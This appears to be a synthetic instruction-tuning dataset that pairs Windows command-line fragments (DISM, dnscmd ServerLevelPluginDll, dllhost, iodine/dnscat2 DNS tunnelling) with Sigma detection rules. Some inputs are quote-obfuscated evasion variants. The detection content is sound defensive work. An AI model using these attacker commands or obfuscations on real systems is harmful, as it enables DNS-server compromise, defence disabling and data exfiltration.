category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'diskshadow.exe'\n        - Image|endswith: '\\diskshadow.exe'\n    selection_flag:\n        CommandLine|contains|windash: '-s '\n    filter_main_ext:\n        # Note: can be changed to an \"endswith\" to avoid rare FPs. But you need to account for quoted paths\n        # Note: Using the \".txt\" is based on the MS documentation example. Best add the extension you use internally before using this rule\n        CommandLine|contains: '.txt'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - False postitve might occur with legitimate or uncommon extensions used internally. Initial baseline is required.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dism.exe DISM.EXE WindowsPowerShellWebAccess /online /enable-feature", "output": "title: PowerShell Web Access Feature Enabled Via DISM\nid: 7e8f2d3b-9c1a-4f67-b9e8-8d9006e0e51f\nstatus: test\ndescription: Detects the use of DISM to enable the PowerShell Web Access feature, which could be used for remote access and potential abuse\nreferences:\n    - https://docs.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature\n    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a\n    - https://gist.github.com/MHaggis/7e67b659af9148fa593cf2402edebb41\nauthor: Michael Haag\ndate: 2024-09-03\ntags:\n    - attack.persistence\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dism.exe'\n        - OriginalFileName: 'DISM.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'WindowsPowerShellWebAccess'\n            - '/online'\n            - '/enable-feature'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate PowerShell Web Access installations by administrators\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dism DISM WindowsPowerShellWebAccess /online /enable-feature", "output": "title: PowerShell Web Access Feature Enabled Via DISM\nid: 7e8f2d3b-9c1a-4f67-b9e8-8d9006e0e51f\nstatus: test\ndescription: Detects the use of DISM to enable the PowerShell Web Access feature, which could be used for remote access and potential abuse\nreferences:\n    - https://docs.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature\n    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a\n    - https://gist.github.com/MHaggis/7e67b659af9148fa593cf2402edebb41\nauthor: Michael Haag\ndate: 2024-09-03\ntags:\n    - attack.persistence\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dism.exe'\n        - OriginalFileName: 'DISM.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'WindowsPowerShellWebAccess'\n            - '/online'\n            - '/enable-feature'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate PowerShell Web Access installations by administrators\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dism.exe DISM.EXE WindowsPowerShellWebAccess /online /enable-feature", "output": "title: PowerShell Web Access Feature Enabled Via DISM\nid: 7e8f2d3b-9c1a-4f67-b9e8-8d9006e0e51f\nstatus: test\ndescription: Detects the use of DISM to enable the PowerShell Web Access feature, which could be used for remote access and potential abuse\nreferences:\n    - https://docs.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature\n    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a\n    - https://gist.github.com/MHaggis/7e67b659af9148fa593cf2402edebb41\nauthor: Michael Haag\ndate: 2024-09-03\ntags:\n    - attack.persistence\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dism.exe'\n        - OriginalFileName: 'DISM.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'WindowsPowerShellWebAccess'\n            - '/online'\n            - '/enable-feature'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate PowerShell Web Access installations by administrators\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DismHost.exe /Online /Disable-Feature \\Dism.exe /Online /Disable-Feature", "output": "title: Dism Remove Online Package\nid: 43e32da2-fdd0-4156-90de-50dfd62636f9\nstatus: test\ndescription: Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism\n    - https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html\nauthor: frack113\ndate: 2022-01-16\nmodified: 2022-08-26\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_dismhost:\n        Image|endswith: '\\DismHost.exe'\n        ParentCommandLine|contains|all:\n            - '/Online'\n            - '/Disable-Feature'\n            # - '/FeatureName:'\n            # - '/Remove'\n            # /NoRestart\n            # /quiet\n    selection_dism:\n        Image|endswith: '\\Dism.exe'\n        CommandLine|contains|all:\n            - '/Online'\n            - '/Disable-Feature'\n            # - '/FeatureName:'\n            # - '/Remove'\n            # /NoRestart\n            # /quiet\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate script\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DismHost.exe /Online /Disable-Feature \\\"D\"\"i\"\"s\"\"m\"\".\"\"e\"\"x\"\"e\" /Online /Disable-Feature", "output": "title: Dism Remove Online Package\nid: 43e32da2-fdd0-4156-90de-50dfd62636f9\nstatus: test\ndescription: Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism\n    - https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html\nauthor: frack113\ndate: 2022-01-16\nmodified: 2022-08-26\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_dismhost:\n        Image|endswith: '\\DismHost.exe'\n        ParentCommandLine|contains|all:\n            - '/Online'\n            - '/Disable-Feature'\n            # - '/FeatureName:'\n            # - '/Remove'\n            # /NoRestart\n            # /quiet\n    selection_dism:\n        Image|endswith: '\\Dism.exe'\n        CommandLine|contains|all:\n            - '/Online'\n            - '/Disable-Feature'\n            # - '/FeatureName:'\n            # - '/Remove'\n            # /NoRestart\n            # /quiet\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate script\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DismHost /Online /Disable-Feature \\Dism /Online /Disable-Feature", "output": "title: Dism Remove Online Package\nid: 43e32da2-fdd0-4156-90de-50dfd62636f9\nstatus: test\ndescription: Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism\n    - https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html\nauthor: frack113\ndate: 2022-01-16\nmodified: 2022-08-26\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_dismhost:\n        Image|endswith: '\\DismHost.exe'\n        ParentCommandLine|contains|all:\n            - '/Online'\n            - '/Disable-Feature'\n            # - '/FeatureName:'\n            # - '/Remove'\n            # /NoRestart\n            # /quiet\n    selection_dism:\n        Image|endswith: '\\Dism.exe'\n        CommandLine|contains|all:\n            - '/Online'\n            - '/Disable-Feature'\n            # - '/FeatureName:'\n            # - '/Remove'\n            # /NoRestart\n            # /quiet\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate script\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DismHost.exe /Online /Disable-Feature \\Dism.exe /Online /Disable-Feature", "output": "title: Dism Remove Online Package\nid: 43e32da2-fdd0-4156-90de-50dfd62636f9\nstatus: test\ndescription: Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism\n    - https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html\nauthor: frack113\ndate: 2022-01-16\nmodified: 2022-08-26\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_dismhost:\n        Image|endswith: '\\DismHost.exe'\n        ParentCommandLine|contains|all:\n            - '/Online'\n            - '/Disable-Feature'\n            # - '/FeatureName:'\n            # - '/Remove'\n            # /NoRestart\n            # /quiet\n    selection_dism:\n        Image|endswith: '\\Dism.exe'\n        CommandLine|contains|all:\n            - '/Online'\n            - '/Disable-Feature'\n            # - '/FeatureName:'\n            # - '/Remove'\n            # /NoRestart\n            # /quiet\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate script\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dllhost.exe", "output": "title: Dllhost.EXE Execution Anomaly\nid: e7888eb1-13b0-4616-bd99-4bc0c2b054b9\nstatus: test\ndescription: Detects a \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.\nreferences:\n    - https://redcanary.com/blog/child-processes/\n    - https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08\n    - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-27\nmodified: 2023-05-15\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dllhost.exe'\n        CommandLine:\n            - 'dllhost.exe'\n            - 'dllhost'\n    filter_main_null:\n        CommandLine: null\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\dllhost.exe\"", "output": "title: Dllhost.EXE Execution Anomaly\nid: e7888eb1-13b0-4616-bd99-4bc0c2b054b9\nstatus: test\ndescription: Detects a \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.\nreferences:\n    - https://redcanary.com/blog/child-processes/\n    - https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08\n    - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-27\nmodified: 2023-05-15\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dllhost.exe'\n        CommandLine:\n            - 'dllhost.exe'\n            - 'dllhost'\n    filter_main_null:\n        CommandLine: null\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dllhost", "output": "title: Dllhost.EXE Execution Anomaly\nid: e7888eb1-13b0-4616-bd99-4bc0c2b054b9\nstatus: test\ndescription: Detects a \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.\nreferences:\n    - https://redcanary.com/blog/child-processes/\n    - https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08\n    - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-27\nmodified: 2023-05-15\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dllhost.exe'\n        CommandLine:\n            - 'dllhost.exe'\n            - 'dllhost'\n    filter_main_null:\n        CommandLine: null\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dllhost.exe", "output": "title: Dllhost.EXE Execution Anomaly\nid: e7888eb1-13b0-4616-bd99-4bc0c2b054b9\nstatus: test\ndescription: Detects a \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.\nreferences:\n    - https://redcanary.com/blog/child-processes/\n    - https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08\n    - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-27\nmodified: 2023-05-15\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dllhost.exe'\n        CommandLine:\n            - 'dllhost.exe'\n            - 'dllhost'\n    filter_main_null:\n        CommandLine: null\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dnscmd.exe /enumrecords /enumzones /ZonePrint /info", "output": "title: Potential Discovery Activity Via Dnscmd.EXE\nid: b6457d63-d2a2-4e29-859d-4e7affc153d1\nstatus: test\ndescription: Detects an attempt to leverage dnscmd.exe to enumerate the DNS zones of a domain. DNS zones used to host the DNS records for a particular domain.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd\n    - https://learn.microsoft.com/en-us/azure/dns/dns-zones-records\n    - https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/\nauthor: '@gott_cyber'\ndate: 2022-07-31\nmodified: 2023-02-04\ntags:\n    - attack.discovery\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\dnscmd.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '/enumrecords'\n            - '/enumzones'\n            - '/ZonePrint'\n            - '/info'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dnscmd.exe -enumrecords -enumzones /ZonePrint /info", "output": "title: Potential Discovery Activity Via Dnscmd.EXE\nid: b6457d63-d2a2-4e29-859d-4e7affc153d1\nstatus: test\ndescription: Detects an attempt to leverage dnscmd.exe to enumerate the DNS zones of a domain. DNS zones used to host the DNS records for a particular domain.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd\n    - https://learn.microsoft.com/en-us/azure/dns/dns-zones-records\n    - https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/\nauthor: '@gott_cyber'\ndate: 2022-07-31\nmodified: 2023-02-04\ntags:\n    - attack.discovery\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\dnscmd.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '/enumrecords'\n            - '/enumzones'\n            - '/ZonePrint'\n            - '/info'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dnscmd /enumrecords /enumzones /ZonePrint /info", "output": "title: Potential Discovery Activity Via Dnscmd.EXE\nid: b6457d63-d2a2-4e29-859d-4e7affc153d1\nstatus: test\ndescription: Detects an attempt to leverage dnscmd.exe to enumerate the DNS zones of a domain. DNS zones used to host the DNS records for a particular domain.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd\n    - https://learn.microsoft.com/en-us/azure/dns/dns-zones-records\n    - https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/\nauthor: '@gott_cyber'\ndate: 2022-07-31\nmodified: 2023-02-04\ntags:\n    - attack.discovery\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\dnscmd.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '/enumrecords'\n            - '/enumzones'\n            - '/ZonePrint'\n            - '/info'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dnscmd.exe /enumrecords /enumzones /ZonePrint /info", "output": "title: Potential Discovery Activity Via Dnscmd.EXE\nid: b6457d63-d2a2-4e29-859d-4e7affc153d1\nstatus: test\ndescription: Detects an attempt to leverage dnscmd.exe to enumerate the DNS zones of a domain. DNS zones used to host the DNS records for a particular domain.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd\n    - https://learn.microsoft.com/en-us/azure/dns/dns-zones-records\n    - https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/\nauthor: '@gott_cyber'\ndate: 2022-07-31\nmodified: 2023-02-04\ntags:\n    - attack.discovery\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\dnscmd.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '/enumrecords'\n            - '/enumzones'\n            - '/ZonePrint'\n            - '/info'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administration use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dnscmd.exe /config /serverlevelplugindll", "output": "title: New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE\nid: f63b56ee-3f79-4b8a-97fb-5c48007e8573\nrelated:\n    - id: e61e8a88-59a9-451c-874e-70fcc9740d67\n      type: derived\n    - id: cbe51394-cd93-4473-b555-edf0144952d9\n      type: derived\nstatus: test\ndescription: Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)\nreferences:\n    - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\n    - https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2017-05-08\nmodified: 2023-02-05\ntags:\n    - attack.defense-evasion\n    - attack.t1574.001\n    - attack.t1112\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dnscmd.exe'\n        CommandLine|contains|all:\n            - '/config'\n            - '/serverlevelplugindll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dnscmd.exe /\"c\"\"o\"\"n\"\"f\"\"i\"\"g\" /serverlevelplugindll", "output": "title: New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE\nid: f63b56ee-3f79-4b8a-97fb-5c48007e8573\nrelated:\n    - id: e61e8a88-59a9-451c-874e-70fcc9740d67\n      type: derived\n    - id: cbe51394-cd93-4473-b555-edf0144952d9\n      type: derived\nstatus: test\ndescription: Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)\nreferences:\n    - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\n    - https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2017-05-08\nmodified: 2023-02-05\ntags:\n    - attack.defense-evasion\n    - attack.t1574.001\n    - attack.t1112\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dnscmd.exe'\n        CommandLine|contains|all:\n            - '/config'\n            - '/serverlevelplugindll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dnscmd.exe -config /serverlevelplugindll", "output": "title: New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE\nid: f63b56ee-3f79-4b8a-97fb-5c48007e8573\nrelated:\n    - id: e61e8a88-59a9-451c-874e-70fcc9740d67\n      type: derived\n    - id: cbe51394-cd93-4473-b555-edf0144952d9\n      type: derived\nstatus: test\ndescription: Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)\nreferences:\n    - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\n    - https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2017-05-08\nmodified: 2023-02-05\ntags:\n    - attack.defense-evasion\n    - attack.t1574.001\n    - attack.t1112\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dnscmd.exe'\n        CommandLine|contains|all:\n            - '/config'\n            - '/serverlevelplugindll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dnscmd /config /serverlevelplugindll", "output": "title: New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE\nid: f63b56ee-3f79-4b8a-97fb-5c48007e8573\nrelated:\n    - id: e61e8a88-59a9-451c-874e-70fcc9740d67\n      type: derived\n    - id: cbe51394-cd93-4473-b555-edf0144952d9\n      type: derived\nstatus: test\ndescription: Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)\nreferences:\n    - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\n    - https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2017-05-08\nmodified: 2023-02-05\ntags:\n    - attack.defense-evasion\n    - attack.t1574.001\n    - attack.t1112\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dnscmd.exe'\n        CommandLine|contains|all:\n            - '/config'\n            - '/serverlevelplugindll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dnscmd.exe /config /serverlevelplugindll", "output": "title: New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE\nid: f63b56ee-3f79-4b8a-97fb-5c48007e8573\nrelated:\n    - id: e61e8a88-59a9-451c-874e-70fcc9740d67\n      type: derived\n    - id: cbe51394-cd93-4473-b555-edf0144952d9\n      type: derived\nstatus: test\ndescription: Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)\nreferences:\n    - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83\n    - https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2017-05-08\nmodified: 2023-02-05\ntags:\n    - attack.defense-evasion\n    - attack.t1574.001\n    - attack.t1112\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dnscmd.exe'\n        CommandLine|contains|all:\n            - '/config'\n            - '/serverlevelplugindll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\iodine.exe", "output": "title: DNS Exfiltration and Tunneling Tools Execution\nid: 98a96a5a-64a0-4c42-92c5-489da3866cb0\nstatus: test\ndescription: Well-known DNS Exfiltration tools execution\nreferences:\n    - https://github.com/iagox86/dnscat2\n    - https://github.com/yarrick/iodine\nauthor: Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.exfiltration\n    - attack.t1048.001\n    - attack.command-and-control\n    - attack.t1071.004\n    - attack.t1132.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\iodine.exe'\n        - Image|contains: '\\dnscat2'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\iodine.exe\"", "output": "title: DNS Exfiltration and Tunneling Tools Execution\nid: 98a96a5a-64a0-4c42-92c5-489da3866cb0\nstatus: test\ndescription: Well-known DNS Exfiltration tools execution\nreferences:\n    - https://github.com/iagox86/dnscat2\n    - https://github.com/yarrick/iodine\nauthor: Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.exfiltration\n    - attack.t1048.001\n    - attack.command-and-control\n    - attack.t1071.004\n    - attack.t1132.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\iodine.exe'\n        - Image|contains: '\\dnscat2'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\iodine", "output": "title: DNS Exfiltration and Tunneling Tools Execution\nid: 98a96a5a-64a0-4c42-92c5-489da3866cb0\nstatus: test\ndescription: Well-known DNS Exfiltration tools execution\nreferences:\n    - https://github.com/iagox86/dnscat2\n    - https://github.com/yarrick/iodine\nauthor: Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.exfiltration\n    - attack.t1048.001\n    - attack.command-and-control\n    - attack.t1071.004\n    - attack.t1132.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\iodine.exe'\n        - Image|contains: '\\dnscat2'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\iodine.exe", "output": "title: DNS Exfiltration and Tunneling Tools Execution\nid: 98a96a5a-64a0-4c42-92c5-489da3866cb0\nstatus: test\ndescription: Well-known DNS Exfiltration tools execution\nreferences:\n    - https://github.com/iagox86/dnscat2\n    - https://github.com/yarrick/iodine\nauthor: Daniil Yugoslavskiy, oscd.community\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.exfiltration\n    - attack.t1048.001\n    - attack.command-and-control\n    - attack.t1071.004\n    - attack.t1132.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\iodine.exe'\n        - Image|contains: '\\dnscat2'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dns.exe \\conhost.exe", "output": "title: Unusual Child Process of dns.exe\nid: a4e3d776-f12e-42c2-8510-9e6ed1f43ec3\nstatus: test\ndescription: Detects an unexpected process spawning from dns.exe which may indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed)\nreferences:\n    - https://www.elastic.co/guide/en/security/current/unusual-child-process-of-dns-exe.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\nmodified: 2023-02-05\ntags:\n    - attack.initial-access\n    - attack.t1133\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dns.exe'\n    filter:\n        Image|endswith: '\\conhost.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dns.exe \\conho\\\"st.exe\\\"", "output": "title: Unusual Child Process of dns.exe\nid: a4e3d776-f12e-42c2-8510-9e6ed1f43ec3\nstatus: test\ndescription: Detects an unexpected process spawning from dns.exe which may indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed)\nreferences:\n    - https://www.elastic.co/guide/en/security/current/unusual-child-process-of-dns-exe.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\nmodified: 2023-02-05\ntags:\n    - attack.initial-access\n    - attack.t1133\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dns.exe'\n    filter:\n        Image|endswith: '\\conhost.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dns \\conhost", "output": "title: Unusual Child Process of dns.exe\nid: a4e3d776-f12e-42c2-8510-9e6ed1f43ec3\nstatus: test\ndescription: Detects an unexpected process spawning from dns.exe which may indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed)\nreferences:\n    - https://www.elastic.co/guide/en/security/current/unusual-child-process-of-dns-exe.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\nmodified: 2023-02-05\ntags:\n    - attack.initial-access\n    - attack.t1133\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dns.exe'\n    filter:\n        Image|endswith: '\\conhost.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
